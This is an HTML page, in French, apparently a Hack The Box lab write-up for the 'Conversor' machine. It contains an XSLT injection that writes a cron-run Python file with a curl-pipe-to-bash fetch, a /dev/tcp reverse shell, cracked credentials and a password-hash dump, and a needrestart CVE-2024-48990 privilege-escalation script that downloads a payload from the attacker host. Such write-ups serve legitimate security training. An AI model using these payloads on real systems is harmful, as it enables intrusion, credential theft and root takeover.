@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="fr" class="dark">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Conversor - Writeup HTB</title>
+    <meta name="description" content="Writeup Hack The Box - Conversor">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="../writeups.css">
+    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
+</head>
+
+<body class="writeups-mode">
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-content">
+                <a href="../../" class="nav-logo-link">
+                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
+                        alt="logo signature Raphaël">
+                </a>
+                <div class="nav-links">
+                    <a href="../../" class="nav-link">Accueil</a>
+                    <a href="../" class="nav-link active">Writeups</a>
+                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="min-h-screen">
+        <div class="writeups-container">
+            <a href="../" class="back-link">← Retour aux writeups</a>
+            <div class="writeup-content">
+<header><h1 class="page-title" dir="auto"><strong>Conversor</strong></h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="29aaa764-c45c-80cd-9d44-e8b2647058ee" class="">User</h1></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80ab-874b-fd028fe5b5e5" class="">Scan nmap de <code><strong>10.10.11.92</strong></code><strong> la machine </strong></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80f8-9f73-e50477a39678" class="">le port 8000 est ouvert donc dans le navigateur et je regarde la page http a cette ip et ce port</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80bc-a2f1-d30f9e84c440" class="">Il y a un fichier .db Téléchargement et je le consulte, Il y a une table users dans laquelle figure <code>amin</code> avec pour hash <code>21232f297a57a5a743894a0e4a801fc3</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-804a-b4e1-c92555555aad" class="">je crack le hash avec </p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-809b-ae88-cbfb9b3537e1" class="code code-wrap"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~$ hashcat -m 0 -a 0 21232f297a57a5a743894a0e4a801fc3 /usr/share/wordlists/rockyou.txt
+21232f297a57a5a743894a0e4a801fc3:admin                    
+</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-804f-ab0e-ec4fc678e44c" class="">le port 22 est ouvert donc j’essaie de me ssh en admin</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8085-b066-c94afd461d8f" class="">ça marche pas</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-805c-97c1-ea085269f5d6" class="">commencer a reflechir, Il y a une table files </p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80d2-84c3-caa4d924a0e8" class="">Les fichiers avec <code>user_id = 21</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-804d-9774-e88dd88d50aa" class="">appartiennent à admin :</p></div><div style="display:contents" dir="auto"><ul id="29aaa764-c45c-80cf-bd94-fbf61dace88b" class="bulleted-list"><li style="list-style-type:disc"><code>02da907e-ff13-482f-8db3-8f9dc4acb513.html</code></li></ul></div><div style="display:contents" dir="auto"><ul id="29aaa764-c45c-8010-a1b9-faca2507781c" class="bulleted-list"><li style="list-style-type:disc"><code>eec6152e-2bfb-45a0-940c-55bb18e639e2.html</code></li></ul></div><div style="display:contents" dir="auto"><ul id="29aaa764-c45c-8074-b238-e35d9563dfbd" class="bulleted-list"><li style="list-style-type:disc"><code>658a4e6e-8ccf-448f-9e27-39a8cae7d7f0.html</code></li></ul></div><div style="display:contents" dir="auto"><ul id="29aaa764-c45c-80d8-bb31-d2ea60e529df" class="bulleted-list"><li style="list-style-type:disc"><code>8b3a4e49-9717-4601-a8e0-6d0fbe9ffe5f.html</code></li></ul></div><div style="display:contents" dir="auto"><ul id="29aaa764-c45c-80a3-aa0d-c996d8528068" class="bulleted-list"><li style="list-style-type:disc"><code>79108343-7314-43c9-8099-9a65863b56dc.html</code></li></ul></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80c9-97fa-dbb083dfc0e9" class="">aucune de ces pages n’est accessible sur la page web la ffuf pour savoir ce q’Il y a comme page ; aucun résultat exploitable</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8087-a215-df55e378ebf6" class="">dans la db il manque les users 2 et 3 </p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80a5-aaa0-c86c6d6a1583" class="">quand je me connecte sans le port (je n’avais pas encore essayé) ça me met au port 80 et je me retrouve sur une page de login</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-806d-a610-e0ab3ca375ae" class="">je me connecte avec les mdp que j’ai cracké de la db</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80bd-9c53-cde2f8f81904" class=""><code>admin:admin</code> fonctionne</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8089-a2ed-d1f96bf1071c" class="">c’est un convertisseur xml/xslt, je cherche donc des vulns qui concernent ca et je tombe sur <a href="https://ine.com/blog/xslt-injections-for-dummies">https://ine.com/blog/xslt-injections-for-dummies</a></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-801c-b5b0-ca16440d4db0" class="">Test avec avec </p></div><div style="display:contents" dir="auto"><h3 id="29aaa764-c45c-8084-a44c-f8aa47980a9c" class="">Détection du processeur XSLT</h3></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80bc-874b-e189adc9d18a" class="">c’etait un peu long donc j’ai mis mes essais ici</p></div><div style="display:contents" dir="ltr"></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80d5-b370-c964037aa934" class="">CE QUE JE SAIS</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80d4-96f7-de472f8bbce9" class="">Le filtre de l&#x27;application (Python) bloque les chaînes littérales (<code>file://</code>, <code>http://</code>, <code>document</code>)</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80cf-98f8-cef855858e32" class="">Le bypass avec <code>dyn:evaluate(concat(...))</code> fonctionne et contourne ce filtre</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8017-91aa-c0ce6cc34305" class="">Le payload est ensuite passé au processeur <code>libxslt</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80e5-95e0-ed9f83f0c95e" class=""><code>libxslt</code> est configuré de manière sécurisée et bloque<strong> </strong><code><strong>document()</strong></code><strong> et </strong><code><strong>include/import</strong></code>, quel que soit le protocole (<code>file://</code> ou <code>http://</code>) et c’est lui qui génère l’erreur</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-803e-8682-da766bf3d3e9" class="">bon j’avais juste a explorer la page pour voir que le code source est disponible</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-803e-b662-e69dff2c1d2d" class="">je regarde le <a href="http://app.py">app.py</a> et On observe que </p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-804f-8fcf-e4dbb7e9f823" class="code code-wrap"><code class="language-undefined" style="white-space:pre-wrap;word-break:break-all">        xml_tree = etree.parse(xml_path, parser)
+        xslt_tree = etree.parse(xslt_path)</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80b7-97e8-c2f507ed6657" class="">le fichier xslt n’est pas parsé avec le parser sécurisé contrairement au fichier xml</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-804c-bc60-d7b951874e86" class="">après avoir encore testé des payloads je RECONTEXTUALISE, On observe que je n’ai toujours pas lu le install.md, c’est peut etre le moment</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8019-9d6e-cfc6ac3728a9" class="">il y a un enorme indice sur le user : www-data est un des users systeme donc c’est lui que utiliser </p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-801f-93a6-c81c9f2428d1" class="">on sait aussi que le server dans son crontab execute tous les scripts .py qui sont à <code>/var/www/conversor.htb/scripts/</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80e8-9481-df01355ae2c1" class="">le <code>xslt</code> malveillant fait après la découverte de <a href="https://exslt.github.io/exsl/elements/document/index.html">common</a> et de <a href="https://exslt.github.io/exsl/index.html">ça</a></p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-80d1-9481-c84eaf6d85c4" class="code code-wrap"><code class="language-undefined" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;xsl:stylesheet 
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; 
+xmlns:shell=&quot;http://exslt.org/common&quot;
+extension-element-prefixes=&quot;shell&quot;
+version=&quot;1.0&quot;
+&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+&lt;shell:document href=&quot;/var/www/conversor.htb/scripts/shell.py&quot; method=&quot;text&quot;&gt;
+import os
+os.system(&quot;curl 10.10.15.105:8000/shell.sh|bash&quot;)
+&lt;/shell:document&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80bb-ba42-f046e09cfb97" class=""><code>shell.sh</code> généré avec <a href="https://www.revshells.com/">revshells</a></p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-804b-9ad0-d0a0b5e9dc47" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash                                     
+sh -i &gt;&amp; /dev/tcp/10.10.15.105/9001 0&gt;&amp;1</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8070-bb1f-f7a7d26e0830" class="">Lancement de un server python pour servir le shell parce que Il y a des caractères qui étaient mal compris par le xslt il y avait un problème de parse</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80ea-a05d-e80a6727ec16" class="">Lancement de aussi un netcat pour le revshell sur 9001 donc</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80cc-b1e3-ff0eeaf84955" class="">j’attends 60 sec que le crontab execute mon shell</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8091-900d-fbb3f77d4665" class="">J’AI UN SHELL</p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-80a6-8662-dc55f6d88924" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~/Documents/htn$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.11.92 55448
+sh: 0: can&#x27;t access tty; job control turned off
+$ ls
+conversor.htb
+$ whoami
+www-data
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+syslog:x:106:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+_laurel:x:998:998::/var/log/laurel:/bin/false
+$ ls -la
+total 12
+drwxr-x---  3 www-data www-data 4096 Aug 15 05:19 .
+drwxr-xr-x 13 root     root     4096 Jul 31 03:55 ..
+lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .bash_history -&gt; /dev/null
+drwxr-x---  8 www-data www-data 4096 Aug 14 21:34 conversor.htb
+lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .python_history -&gt; /dev/null
+lrwxrwxrwx  1 root     root        9 Aug 15 05:19 .sqlite_history -&gt; /dev/null</code></pre></div><div style="display:contents" dir="auto"></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80f5-826b-e15d380996db" class="">je veux un vrai shell donc je découvre <a href="https://hidepatidar.medium.com/spawning-interactive-reverse-shell-7732686ea775">ça</a> qui me permet d’avoir un vrai shell</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-804a-afe9-f873e3ed8ba3" class="">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)’</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80d8-85eb-ce15f2436488" class="">dans le code source donné par le site on sait que la db est dans <code>conversor.htb/instance</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8094-970c-fea05efb2356" class="">donc je me cd dedans et dans la db avec  <code>sqlite3</code></p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-802e-ab15-f5b2ea6fa1cc" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">paph@pc-paph:~/Documents/htn$ nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.11.92 52440
+sh: 0: can&#x27;t access tty; job control turned off
+$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)
+www-data@conversor:~$ cd conversor.htb/instance
+cd conversor.htb/instance
+www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db
+sqlite3 users.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter &quot;.help&quot; for usage hints.
+sqlite&gt; select * from users;
+select * from users;
+1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
+5|pwn|e4a25f7b052442a076b02ee9a1818d2e
+6|test|098f6bcd4621d373cade4e832627b4f6
+7|admin|21232f297a57a5a743894a0e4a801fc3
+8|test123|cc03e747a6afbbcbf8be7668acfebee5</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-802e-8013-f1def137945b" class="">je hashcat les creds de <code>fismathack</code> et je les utilise pour me ssh</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80e7-86be-d66a4af9bc71" class="block-color-blue">NOTE IMPORTANTE : la db je l’avais a la minute 1 du chal donc je pense que un participant du challenge l’aexposé mais quoiqu’il en soit si j’avais utilisé le bon user des le debut j’aurais économisé 7h, ok GG</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80c7-a54d-dee89d1bc8d1" class="">creds ssh : <code>fismathack:Keepmesafeandwarm</code></p></div><div style="display:contents" dir="auto"><h1 id="29aaa764-c45c-80bf-9c27-fdc1fe48cd2a" class="">Root</h1></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80d5-972a-c554ea5a4099" class="">je commence par linpeas</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-802d-9006-d5ed6bf8340d" class="">vu qu’il n’y a pas internet sur la machine je l’installe sur la mienne et Lancement de un server python puis depuis la machine Téléchargement :  <code>wget http://10.10.15.105:8000/linpeas.sh</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-807a-b7b4-e01805825f53" class="">dans le retour on voit <code>(ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8072-be3a-d359702e31e6" class="">On observe que c’est la version 3.7 :</p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-8004-8cd6-e3bee2614520" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">fismathack@conversor:~$ /usr/sbin/needrestart --version
+
+needrestart 3.7 - Restart daemons after library updates.</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80bf-9d78-c833c16d56df" class="">le classico google dork <code>&quot;needrestart&quot; &quot;3.7&quot; privilege escalation</code></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-803b-9edf-fe63af1ca47a" class="">Il y a un script d’exploit de cette cve <a href="https://github.com/ten-ops/CVE-2024-48990_needrestart">https://github.com/ten-ops/CVE-2024-48990_needrestart</a></p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-8032-a65b-e7c58f52f37b" class="">la machine n’a pas internet et n’a pas make je dois donc faire un sh qui contient tout (merci Claude)</p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-8041-b2ab-cf68b32ceaac" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">#!/bin/bash
+set -e
+cd /tmp
+
+# 1. Create the malicious module directory structure
+mkdir -p malicious/importlib
+
+# 2. Download our compiled C payload from our attacker server
+#    (Replace 10.10.14.81 with your attacker IP)
+curl http://10.10.15.105:4444/__init__.so -o /tmp/malicious/importlib/__init__.so
+
+# 3. Create the &quot;bait&quot; Python script (e.py)
+#    This script just loops, waiting for the exploit to work
+cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/malicious/e.py
+import time
+import os
+
+while True:
+    try:
+        import importlib
+    except:
+        pass
+    
+    # When our C payload runs, it creates /tmp/poc
+    # This loop waits for that file to exist
+    if os.path.exists(&quot;/tmp/poc&quot;):
+        print(&quot;Got shell!, delete traces in /tmp/poc, /tmp/malicious&quot;)
+        # The C payload also added a sudoers rule.
+        # We use that rule to pop our root shell.
+        os.system(&quot;sudo /tmp/poc -p&quot;)
+        break
+    time.sleep(1)
+EOF
+
+# 4. This is the magic!
+#    Run the bait script (e.py) with the PYTHONPATH hijacked.
+#    This process will just sit here, waiting for needrestart to scan it.
+echo &quot;Bait process is running. Trigger &#x27;sudo /usr/sbin/needrestart&#x27; in another shell.&quot;
+cd /tmp/malicious; PYTHONPATH=&quot;$PWD&quot; python3 e.py 2&gt;/dev/null</code></pre></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80f6-8015-e2069b430af6" class="">Lancement de un server python sur 4444 contenant le payload</p></div><div style="display:contents" dir="auto"><p id="29aaa764-c45c-80b1-b757-e02576ca1249" class="">sur la machine je dois avoir deux shell ssh: sur le premier Lancement de le sh et sur le second je fais <code>sudo /usr/sbin/needrestart</code></p></div><div style="display:contents" dir="auto"><pre id="29aaa764-c45c-8091-82cf-dee47c5f0548" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">fismathack@conversor:~$ ./runner.sh
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+Dload  Upload   Total   Spent    Left  Speed
+100 13256  100 13256    0     0  35029      0 --:--:-- --:--:-- --:--:-- 35068
+Bait process is running. Trigger &#x27;sudo /usr/sbin/needrestart&#x27; in another shell.
+Got shell!, delete traces in /tmp/poc, /tmp/malicious
+whoami
+root
+cd /
+ls
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media	mnt  opt  proc	root  run  sbin  srv  sys  tmp	usr  var
+fismathack@conversor:~$ ./runner.sh 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 13256  100 13256    0     0  35029      0 --:--:-- --:--:-- --:--:-- 35068
+Bait process is running. Trigger &#x27;sudo /usr/sbin/needrestart&#x27; in another shell.
+Got shell!, delete traces in /tmp/poc, /tmp/malicious
+whoami
+root
+ls
+e.py  importlib  lib.c
+pwd
+/tmp/malicious
+cd /
+ls
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media	mnt  opt  proc	root  run  sbin  srv  sys  tmp	usr  var
+cd root	
+ls
+root.txt  scripts
+cat root.txt
+2f99efac37c00eee26e9231b421d3678
+exit</code></pre></div><div style="display:contents" dir="auto"></div></div>
+            </div>
+        </div>
+    </main>
+</body>
+
+</html>
